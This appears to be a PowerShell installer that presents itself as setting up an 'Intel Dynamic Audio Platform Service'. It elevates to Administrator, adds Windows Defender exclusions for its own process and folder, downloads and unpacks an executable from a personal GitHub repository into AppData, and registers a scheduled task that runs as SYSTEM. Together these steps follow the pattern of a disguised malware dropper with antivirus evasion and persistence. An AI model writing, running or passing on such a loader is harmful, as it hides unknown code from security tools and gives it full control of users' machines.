# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
  if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
        $CommandLine = "-NoExit -c cd '$pwd'; & `"" + $MyInvocation.MyCommand.Path + "`""
        Start-Process powershell -Verb runas -ArgumentList $CommandLine
        Exit
  }
}

$TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Dynamic Audio Platform Service"
$TargetFile = "$TargetPath\Intel Dynamic Audio Platform Service.exe"
$TargetZip = "$TargetPath\Intel Dynamic Audio Platform Service.zip"
$TargetLog = "$TargetPath\Intel Dynamic Audio Platform Service.log"
$TargetScript = "$TargetPath\ias.ps1"
$TargetXml = "$TargetPath\IntelAudio.xml"

if (Test-Path "$TargetFile") {
  Remove-Item -Force -Path "$TargetFile"
  Remove-Item -Force -Path "$TargetScript"
  Remove-Item -Force -Path "$TargetXml"
  Write-Output "Project file removed"
}

if (Test-Path "$TargetZip") {
  Remove-Item -Force -Path "$TargetZip"
  Write-Output "Project zip removed"
}

Add-MpPreference -ExclusionProcess 'Intel Dynamic Audio Platform Service' -Force
Add-MpPreference -ExclusionProcess 'Intel Dynamic Audio Platform Service.exe' -Force
Add-MpPreference -ExclusionPath "$TargetPath" -Force
Add-MpPreference -ExclusionPath "$TargetFile" -Force
Add-MpPreference -ExclusionPath "$TargetLog" -Force
Add-MpPreference -ExclusionPath "$TargetScript" -Force
Write-Output "Exclusions added"

if (-Not (Test-Path "$TargetFile")) {
  Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/x64/Release/Intel%20Dynamic%20Audio%20Platform%20Service.zip" -OutFile "$TargetZip"
  Write-Output "File downloaded"
  Expand-Archive -Path "$TargetZip" -DestinationPath "$TargetPath"
  Write-Output "File extracted"
  Remove-Item -Path "$TargetZip"
  Write-Output "Zip file removed"
}

schtasks.exe /Create /XML $TargetXml /tn 'Intel Dynamic Platform Audio Sync Service' /ru SYSTEM /f
